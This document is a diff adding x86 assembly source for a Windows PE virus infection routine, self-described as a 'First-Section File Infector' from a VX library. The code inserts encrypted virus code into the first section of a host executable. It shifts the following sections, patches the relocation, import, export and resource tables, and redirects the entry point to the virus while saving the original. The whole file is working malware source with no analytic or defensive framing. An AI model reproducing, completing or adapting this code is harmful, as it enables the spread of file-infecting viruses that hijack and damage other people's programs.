@@ -1,0 +1,363 @@
+;%%%4 0 INC1 Insert in 1st section
+
+;our infection process consist in inserting to 1st section of host file
+
+infect_image:
+	pushad
+
+	push eax		;map
+	push ecx		;size
+	call delta
+	lea edx,[ebp+virus_main]
+	push edx
+        call get_virus_size
+	push eax
+	push 0
+	push original_entrypoint-virus_main
+	call infect_file
+	mov [esp.Pushad_eax],eax
+
+	popad
+	ret
+
+
+;           First-Section File Infector (VX Library). Freeware
+
+infect_file             proc    pascal
+
+                        arg     viroldeip       ; old eip ptr (rel2virstart)
+                        arg     virentry        ; vir entry (rel2virstart)
+                        arg     virsize         ; vir filesize
+                        arg     virstart        ; vir start
+                        arg     filesize     	; map filesize
+                        arg     fileptr     	; map
+
+                        local   objtableptr
+                        local   virsize_aligned
+                        local   resourcebase
+
+                        pusha
+
+			mov esi,fileptr
+                        mov     edi, [esi.MZ_lfanew]
+                        cmp     edi, [filesize]
+                        jae     @@close
+
+                        add     edi, esi
+
+                        cmp     [edi.NT_OptionalHeader.OH_AddressOfEntryPoint], 0
+                        je      @@close
+
+                        test    [edi.NT_FileHeader.FH_Characteristics],1  ; need relocs
+                        jnz     @@close
+
+; calculate file-and-object-aligned virsize
+
+                        mov     eax, virsize
+
+                        mov     ecx, [edi.NT_OptionalHeader.OH_FileAlignment]
+                        dec     ecx
+                        add     eax, ecx
+                        not     ecx
+                        and     eax, ecx
+
+                        mov     ecx, [edi.NT_OptionalHeader.OH_SectionAlignment]
+                        dec     ecx
+                        add     eax, ecx
+                        not     ecx
+                        and     eax, ecx
+
+                        mov     virsize_aligned, eax
+
+; calculate object table offset
+                        movzx   eax, [edi.NT_FileHeader.FH_SizeOfOptionalHeader]
+                        lea     eax, [edi+eax+18h]
+                        mov     objtableptr, eax
+
+; fix resources (.rsrc) if present
+                        cmp     [edi.NT_OptionalHeader.OH_DirectoryEntries.DE_Resource.DD_VirtualAddress],0
+                        je      @@skipfixres
+
+                        push    [edi.NT_OptionalHeader.OH_DirectoryEntries.DE_Resource.DD_VirtualAddress]
+                        call    @@virt2phys
+                        pop     edx
+                        mov     resourcebase, edx
+                        call    @@fix_rsrc
+@@skipfixres:
+
+; fix relocs
+                        push    [edi.NT_OptionalHeader.OH_DirectoryEntries.DE_BaseReloc.DD_VirtualAddress]
+                        call    @@virt2phys
+                        pop     ebx
+
+                        mov     edx, [edi.NT_OptionalHeader.OH_DirectoryEntries.DE_BaseReloc.DD_Size]
+                        add     edx, ebx
+
+@@rel_cycle:            pusha
+
+                        push    dword ptr [ebx]
+                        call    @@virt2phys
+                        pop     esi
+
+                        mov     ecx, [ebx+4]
+                        sub     ecx, 8
+                        add     ebx, 8
+
+@@rel_fix:              or      ecx, ecx
+                        jz      @@rel_end
+
+                        mov     eax, [ebx]
+                        shr     ah, 4
+                        cmp     ah, 3
+                        jne     @@rel_skip
+
+                        mov     eax, [ebx]
+                        and     eax, 0FFFh
+
+                        mov     edx, virsize_aligned
+                        add     [esi+eax], edx
+@@rel_skip:
+                        add     ebx, 2
+                        sub     ecx, 2
+                        jmp     @@rel_fix
+@@rel_end:
+                        popa
+
+                        mov     eax, virsize_aligned  ; fix page rva
+                        add     [ebx], eax
+
+                        add     ebx, [ebx+4]
+                        cmp     ebx, edx
+                        jb      @@rel_cycle
+
+; fix import table
+
+                        mov     ecx, [edi.NT_OptionalHeader.OH_DirectoryEntries.DE_Import.DD_VirtualAddress]
+                        jecxz   @@skipfiximp
+
+                        push    ecx
+                        call    @@virt2phys
+                        pop     ebx
+
+                        mov     eax, virsize_aligned
+
+@@imp_cycle:            cmp     dword ptr [ebx], 0
+                        je      @@imp_exit
+
+                        push    dword ptr [ebx+00h]
+                        call    @@virt2phys
+                        pop     ecx
+
+@@imp1_cycle:           cmp     dword ptr [ecx], 0
+                        je      @@imp1_exit
+                        add     [ecx], eax
+                        add     ecx, 4
+                        jmp     @@imp1_cycle
+@@imp1_exit:
+                        add     [ebx+00h], eax
+                        add     [ebx+0Ch], eax
+                        add     [ebx+10h], eax
+
+                        add     ebx, 14h
+                        jmp     @@imp_cycle
+@@imp_exit:
+@@skipfiximp:
+
+; fix export table
+
+                        mov     ecx, [edi.NT_OptionalHeader.OH_DirectoryEntries.DE_Export.DD_VirtualAddress]
+                        jecxz   @@skipfixexp
+
+                        push    ecx
+                        call    @@virt2phys
+                        pop     ebx
+
+                        mov     eax, virsize_aligned
+
+                        add     [ebx.ED_Name], eax
+
+                        push    [ebx.ED_AddressOfFunctions]
+                        call    @@virt2phys
+                        pop     edx
+                        mov     ecx, [ebx.ED_NumberOfFunctions]
+@@fixexp1:              jecxz   @@fixexp1x
+                        add     [edx], eax
+                        add     edx, 4
+                        dec     ecx
+                        jmp     @@fixexp1
+@@fixexp1x:
+                        push    [ebx.ED_AddressOfNames]
+                        call    @@virt2phys
+                        pop     edx
+                        mov     ecx, [ebx.ED_NumberOfNames]
+@@fixexp2:              jecxz   @@fixexp2x
+                        add     [edx], eax
+                        add     edx, 4
+                        dec     ecx
+                        jmp     @@fixexp2
+@@fixexp2x:
+                        add     [ebx.ED_AddressOfFunctions], eax
+                        add     [ebx.ED_AddressOfNames], eax
+                        add     [ebx.ED_AddressOfOrdinals], eax
+@@skipfixexp:
+
+
+; fix object table
+                        mov     ebx, objtableptr
+                        movzx   ecx, [edi.NT_FileHeader.FH_NumberOfSections] ; ecx = objcount
+
+                        mov     eax, virsize_aligned
+
+                        add     [ebx.SH_SizeOfRawData], eax
+                        add     [ebx.SH_VirtualSize], eax
+
+@@obj_cycle:            add     ebx, IMAGE_SIZEOF_SECTION_HEADER
+                        dec     ecx
+                        jz      @@obj_end
+                        add     [ebx.SH_PointerToRawData], eax
+                        add     [ebx.SH_VirtualAddress], eax
+                        jmp     @@obj_cycle
+@@obj_end:
+
+; fix entrypointrva
+                        mov     eax, virsize_aligned
+                        add     [edi.NT_OptionalHeader.OH_AddressOfEntryPoint], eax
+
+; fix other PE header entries
+
+                        add     [edi.NT_OptionalHeader.OH_SizeOfCode], eax
+                        add     [edi.NT_OptionalHeader.OH_SizeOfImage], eax
+                        add     [edi.NT_OptionalHeader.OH_BaseOfData], eax
+
+; fix PE rvas
+                        lea     ebx, [edi.NT_OptionalHeader.OH_DataDirectory]
+                        mov     ecx, [edi.NT_OptionalHeader.OH_NumberOfRvaAndSizes]
+                        mov     eax, virsize_aligned
+
+@@rva_cycle:            cmp     dword ptr [ebx], 0
+                        je      @@rva_skip
+                        add     dword ptr [ebx], eax
+
+@@rva_skip:             add     ebx, 8
+                        loop    @@rva_cycle
+
+; increase filesize of file
+                        mov     eax, virsize_aligned
+                        add     [filesize], eax
+
+; set our entrypoint
+                        mov     eax, objtableptr
+                        mov     eax, [eax.SH_VirtualAddress]
+                        add     eax, virentry
+                        xchg    eax, [edi.NT_OptionalHeader.OH_AddressOfEntryPoint]
+
+			add eax,[edi.NT_OptionalHeader.OH_ImageBase]
+			push ebp
+			call delta
+                        mov     dword ptr [ebp+original_entrypoint], eax
+			pop ebp
+
+; move 2nd part of file forward
+
+                        mov     ecx, [filesize]
+                        mov     eax, objtableptr
+                        or [eax.SH_Characteristics],IMAGE_SCN_MEM_WRITE
+                        sub     ecx, [eax.SH_PointerToRawData]
+
+                        add     esi, [filesize]
+                        mov     edi, esi
+                        add     edi, virsize_aligned
+
+                        dec     esi
+                        dec     edi
+
+                        std
+                        rep     movsb
+                        cld
+
+; copy our code into file
+                        mov eax, objtableptr
+                        mov eax, [eax.SH_VirtualAddress]
+                        add eax, virentry
+                        mov     edi, objtableptr
+                        mov     edi, [edi.SH_PointerToRawData]
+                        add     edi, [fileptr]
+                        mov     esi, virstart
+                        mov     ecx, virsize
+                        push ebp
+                        mov ebp,fileptr
+			call encrypt
+                        add ebp, [ebp.MZ_lfanew]
+                        add [ebp.NT_OptionalHeader.OH_AddressOfEntryPoint],eax
+                        pop ebp
+
+@@close:
+			mov eax,[filesize]
+			mov [esp.Pushad_eax],eax
+                        popa
+                        ret
+
+@@virt2phys:            pusha
+
+                        mov     esi, [esp+32+4]
+
+                        movzx   ecx, [edi.NT_FileHeader.FH_NumberOfSections] ; ecx = objcount
+                        mov     ebx, objtableptr
+
+@@v2p_cycle:            mov     eax, esi
+                        sub     eax, [ebx.SH_VirtualAddress]
+                        jc      @@v2p_cont
+                        cmp     eax, [ebx.SH_SizeOfRawData]
+                        jae     @@v2p_cont
+                        add     eax, [ebx.SH_PointerToRawData]
+                        xchg    esi, eax
+                        clc
+                        jmp     @@v2p_exit
+
+@@v2p_cont:             add     ebx, IMAGE_SIZEOF_SECTION_HEADER
+                        dec     ecx
+                        jnz     @@v2p_cycle
+
+                        stc
+
+@@v2p_exit:             add     esi, [fileptr]
+                        mov     [esp+32+4], esi
+
+                        popa
+                        retn
+
+; input: EDX = rsrc offset
+
+@@fix_rsrc:             movzx   ecx, word ptr [edx+0Ch]
+                        movzx   eax, word ptr [edx+0Eh]
+                        add     ecx, eax
+
+                        lea     ebx, [edx+10h]
+
+@@rsrc_cycle:           jecxz   @@rsrc_end
+
+                        mov     eax, [ebx+4]
+                        btr     eax, 31
+                        jnc     @@x_data
+
+                        pusha
+                        mov     edx, eax
+                        add     edx, resourcebase
+                        call    @@fix_rsrc
+                        popa
+
+                        jmp     @@x_both
+@@x_data:
+                        add     eax, resourcebase
+                        push    ecx
+                        mov     ecx, virsize_aligned
+                        add     [eax], ecx
+                        pop     ecx
+@@x_both:
+                        add     ebx, 8
+                        dec     ecx
+                        jmp     @@rsrc_cycle
+
+@@rsrc_end:             retn
+
+endp
